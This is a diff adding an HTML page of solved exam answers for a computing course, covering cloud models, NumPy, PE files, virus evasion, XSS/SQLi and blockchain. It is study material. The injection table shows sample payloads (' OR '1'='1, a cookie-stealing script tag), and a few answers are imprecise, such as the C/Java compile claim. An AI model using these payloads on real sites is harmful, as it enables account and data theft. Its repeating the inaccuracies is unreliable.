+            <li><strong>Communication overhead:</strong> n people require n(n-1)/2 communication channels. Adding people exponentially increases coordination cost.</li>
+            <li><strong>Task dependencies:</strong> Some tasks are inherently sequential. Parallelization has limits — a woman can't make a baby in 1 month by using 9 women.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q2(b) · 6+4 = 10 Marks</div>
+        <div class="sub-question">What are cloud services referred to as '-aaS'? Which cloud service reaches end users?</div>
+        <div class="answer">
+          <h4>Cloud "-aaS" Services</h4>
+          <table class="ans-table">
+            <tr><th>Model</th><th>Full Name</th><th>Description</th><th>Example</th></tr>
+            <tr><td><strong>IaaS</strong></td><td>Infrastructure as a Service</td><td>Raw virtual machines, storage, networking. User manages OS and up.</td><td>AWS EC2, Azure VMs</td></tr>
+            <tr><td><strong>PaaS</strong></td><td>Platform as a Service</td><td>Development platform. User manages only application code.</td><td>Heroku, Google App Engine</td></tr>
+            <tr><td><strong>SaaS</strong></td><td>Software as a Service</td><td>Complete application delivered over internet. User just uses it.</td><td>Gmail, Office 365, Zoom</td></tr>
+            <tr><td><strong>FaaS</strong></td><td>Function as a Service</td><td>Serverless — run individual functions in response to events.</td><td>AWS Lambda</td></tr>
+            <tr><td><strong>DBaaS</strong></td><td>Database as a Service</td><td>Managed database without infrastructure management.</td><td>AWS RDS, Firebase</td></tr>
+          </table>
+          <div class="info-box key"><strong>Which reaches end users?</strong><mark>SaaS</mark> — end users interact with SaaS applications directly (browser or app) without knowing or caring about the underlying infrastructure.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q2(c) · 2×5 = 10 Marks</div>
+        <div class="sub-question">Matrix [[1,2,3],[4,5,6],[7,8,9]]: i. Create 2D array. ii. myarray[:,1]. iii. myarray[2,:]. iv. myarray[1:3,1:3]. v. myarray[1:3,-1].</div>
+        <div class="answer">
+          <h4>NumPy Array Operations</h4>
+<div class="code-block"><span class="keyword">import</span> numpy <span class="keyword">as</span> np
+myarray = np.array([[<span class="num">1</span>,<span class="num">2</span>,<span class="num">3</span>],
+                    [<span class="num">4</span>,<span class="num">5</span>,<span class="num">6</span>],
+                    [<span class="num">7</span>,<span class="num">8</span>,<span class="num">9</span>]])</div>
+          <table class="ans-table">
+            <tr><th>Operation</th><th>Meaning</th><th>Output</th></tr>
+            <tr><td><code>myarray[:,1]</code></td><td>All rows, column index 1</td><td><mark>[2, 5, 8]</mark> — 2nd column</td></tr>
+            <tr><td><code>myarray[2,:]</code></td><td>Row index 2, all columns</td><td><mark>[7, 8, 9]</mark> — 3rd row</td></tr>
+            <tr><td><code>myarray[1:3,1:3]</code></td><td>Rows 1–2, Cols 1–2 (exclusive end)</td><td><mark>[[5,6],[8,9]]</mark></td></tr>
+            <tr><td><code>myarray[1:3,-1]</code></td><td>Rows 1–2, last column (index -1)</td><td><mark>[6, 9]</mark></td></tr>
+          </table>
+          <div class="info-box note"><strong>Slicing Rule</strong>[start:stop] excludes stop index. Negative index counts from end: -1 = last, -2 = second-to-last.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q2(d) · 5 Marks</div>
+        <div class="sub-question">Write code to demonstrate Python is an interpreted language.</div>
+        <div class="answer">
+          <h4>Python as Interpreted Language</h4>
+<div class="code-block"><span class="comment"># Demo: Python executes line by line</span>
+print(<span class="string">"Line 1 executes fine"</span>)       <span class="comment"># runs ✓</span>
+print(<span class="string">"Line 2 also fine"</span>)           <span class="comment"># runs ✓</span>
+x = <span class="num">10</span> / <span class="num">0</span>                          <span class="comment"># Error occurs HERE at runtime!</span>
+print(<span class="string">"Line 4 never reached"</span>)       <span class="comment"># never runs ✗</span>
+
+<span class="comment"># In a compiled language (C/Java), the whole program</span>
+<span class="comment"># would fail to compile. Python runs up to the error line.</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q3 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q3</div>
+      <div class="q-title">PE Sections &amp; Loader, FileAlignment Virus, Polymorphism/Obscuration, IAT Virus, XSS &amp; SQLi</div>
+      <div class="q-marks">5+5+5+5+10 = 30 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <div class="sub-q">
+        <div class="sub-label">Q3(a) · 5 Marks</div>
+        <div class="sub-question">PE section header loader usage — see B22 Q4(b).</div>
+        <div class="answer">
+          <div class="info-box tip"><strong>Quick Summary for Revision</strong>PointerToRawData → where to read from file. SizeOfRawData → how many bytes to read. VirtualAddress → where to place in memory (ImageBase + RVA). VirtualSize → how much memory to allocate (zero-fill excess).</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q3(b) · 5 Marks</div>
+        <div class="sub-question">FileAlignment helps virus enter executable — explain. See B22 Q4(c).</div>
+        <div class="answer">
+          <div class="info-box key"><strong>Core Idea</strong>FileAlignment creates null-byte padding (Code Caves) in sections. Virus writes code into caves, redirects Entry Point. File size unchanged → harder to detect.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q3(c) · 5 Marks</div>
+        <div class="sub-question">How does a virus do obscuration and/or polymorphism to disguise itself?</div>
+        <div class="answer">
+          <h4>Virus Obscuration &amp; Polymorphism</h4>
+          <ul class="ans-list">
+            <li><strong>Encryption/Packers:</strong> Virus encrypts its body with a key; only a small decryptor stub is visible. Each infection uses a different key → different byte pattern → evades signature detection.</li>
+            <li><strong>Polymorphic Viruses:</strong> Virus mutates its own code on each infection while keeping the same behavior. Uses a <mark>mutation engine</mark> that substitutes equivalent instructions, reorders independent instructions, inserts random NOP sleds.</li>
+            <li><strong>Metamorphic Viruses:</strong> Completely rewrites its code using different logic that achieves the same result — no static signature matches. Hardest to detect.</li>
+            <li><strong>Rootkit Techniques:</strong> Hides from OS by hooking system calls — when AV asks "list running processes," the hook removes the virus from the list.</li>
+          </ul>
+          <div class="info-box warn"><strong>Detection Challenge</strong>Signature-based AV fails against polymorphic/metamorphic viruses. Modern AV uses behavioral/heuristic analysis and sandboxing instead.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q3(d) · 5 Marks</div>
+        <div class="sub-question">IAT viruses are hard to detect — why?</div>
+        <div class="answer">
+          <h4>Why IAT Viruses Are Hard to Detect</h4>
+          <ul class="ans-list">
+            <li><strong>No static file modification:</strong> The PE file on disk may look completely normal. Changes happen only in memory after loading.</li>
+            <li><strong>Legitimate import names remain:</strong> Static analysis still sees <code>ReadFile</code>, <code>CreateProcess</code> in the import table — but the actual runtime addresses point to malicious code.</li>
+            <li><strong>Runtime-only detection needed:</strong> Only dynamic analysis (running in a sandbox and monitoring API calls) can detect the substitution.</li>
+            <li><strong>Hides behind trusted processes:</strong> Since the malicious code runs via a legitimate program's imports, it may be attributed to the clean host program.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q3(e) · 10 Marks</div>
+        <div class="sub-question">Briefly explain XSS and SQL Injection attacks on web applications.</div>
+        <div class="answer">
+          <h4>Quick Revision Summary</h4>
+          <table class="ans-table">
+            <tr><th></th><th>XSS</th><th>SQL Injection</th></tr>
+            <tr><td>Attack Vector</td><td>Injected JavaScript in web page</td><td>Malicious SQL in input field</td></tr>
+            <tr><td>Target</td><td>Other users' browsers</td><td>Backend database</td></tr>
+            <tr><td>Impact</td><td>Cookie theft, session hijack</td><td>Data dump, auth bypass, data deletion</td></tr>
+            <tr><td>Example</td><td><code>&lt;script&gt;steal(cookie)&lt;/script&gt;</code></td><td><code>' OR '1'='1</code></td></tr>
+            <tr><td>Prevention</td><td>Output encoding, CSP, HttpOnly</td><td>Parameterized queries, WAF, ORM</td></tr>
+          </table>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q4 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q4</div>
+      <div class="q-title">HIPAA &amp; FISMA, Miner's Task, Double Spending, PoW &amp; BFT, Merkle Tree</div>
+      <div class="q-marks">10 + 5 + 5 + 5 + 5 = 30 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <div class="sub-q">
+        <div class="sub-label">Q4(a) · 10 Marks</div>
+        <div class="sub-question">Briefly discuss HIPAA and FISMA. How much are they enacted in USA?</div>
+        <div class="answer">
+          <h4>Enactment Status</h4>
+          <ul class="ans-list">
+            <li><strong>HIPAA:</strong> Enacted by US Congress in 1996. Enforced by HHS Office for Civil Rights (OCR). Applies nationwide to all covered entities and business associates. Penalties: $100–$50,000 per violation, up to $1.9M per year per violation category. Criminal penalties up to 10 years imprisonment for intentional misuse.</li>
+            <li><strong>FISMA:</strong> Enacted in 2002 as part of the E-Government Act. Updated by FISMA Reform Act 2014. Enforced by OMB and DHS. Applies to ALL federal agencies and federal contractors. Annual compliance reports submitted to Congress. Non-compliance can result in budget cuts and operational restrictions.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q4(b) · 5 Marks</div>
+        <div class="sub-question">Briefly describe the task of miner in a blockchain.</div>
+        <div class="answer">
+          <div class="info-box key"><strong>5-Mark Summary</strong>Miner: (1) collects transactions from mempool, (2) verifies signatures, (3) constructs candidate block, (4) solves PoW (finds nonce making SHA-256 hash below target), (5) broadcasts valid block, (6) earns block reward + fees.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q4(c) · 5 Marks</div>
+        <div class="sub-question">How does blockchain invalidate double spending?</div>
+        <div class="answer">
+          <h4>Double Spending Prevention</h4>
+          <ul class="ans-list">
+            <li><strong>UTXO Model:</strong> Each transaction consumes specific UTXOs (Unspent Transaction Outputs). Once a UTXO is spent in a confirmed transaction, the network rejects any other transaction trying to use it.</li>
+            <li><strong>Consensus / Longest Chain Rule:</strong> Transactions must be confirmed by miners. The honest majority chain always grows faster than an attacker's chain.</li>
+            <li><strong>6-Confirmation Rule:</strong> Best practice to wait for 6 blocks (~1 hour) before accepting a payment as final. Reversing 6 blocks is computationally infeasible.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q4(d) · 5 Marks</div>
+        <div class="sub-question">How is PoW Byzantine fault tolerant?</div>
+        <div class="answer">
+          <h4>PoW and Byzantine Fault Tolerance</h4>
+          <ul class="ans-list">
+            <li><strong>Economic cost of attack:</strong> A malicious miner must outpace honest miners (>51% hash power). The cost of this computation far exceeds any potential gain for most network sizes.</li>
+            <li><strong>Longest chain wins:</strong> All honest miners extend the longest valid chain. Malicious nodes broadcasting invalid blocks are rejected.</li>
+            <li><strong>No trust required:</strong> Miners don't need to identify other miners. The work itself (hash proof) is self-verifying — any node can instantly verify a valid hash.</li>
+          </ul>
+          <div class="info-box note"><strong>Limitation</strong>PoW is only BFT as long as honest miners hold >50% hash rate. At ≤50% honest nodes, Byzantine behavior (51% attack) becomes possible.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q4(e) · 5 Marks</div>
+        <div class="sub-question">How is the Merkle Tree used in blockchain?</div>
+        <div class="answer">
+          <div class="info-box key"><strong>5-Mark Answer Summary</strong>Merkle Tree: binary hash tree of all transactions → produces Merkle Root stored in block header. Use in blockchain: (1) Integrity verification — any changed transaction changes the root, invalidating the block. (2) SPV (light client verification) — verify a tx is in a block using only O(log n) hashes (Merkle Proof), without downloading all transactions. (3) Efficiency — summarizes thousands of transactions in one 32-byte hash.</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</div><!-- end B23 -->
+
+</div><!-- end content -->
+
+<footer>
+  <span>CSE 4105 · Computing for Engineers</span> · IUT · Solved Past Papers B20, B21, B22, B23
+  <div>Answer All Questions · Good Luck 🎯</div>
+</footer>
+
+<script>
+function showYear(id, btn) {
+  document.querySelectorAll('.year-section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.nav-tab').forEach(b => b.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  btn.classList.add('active');
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function toggleQ(header) {
+  header.classList.toggle('open');
+  const body = header.nextElementSibling;
+  body.classList.toggle('open');
+}
+</script>
+</body>
+</html>
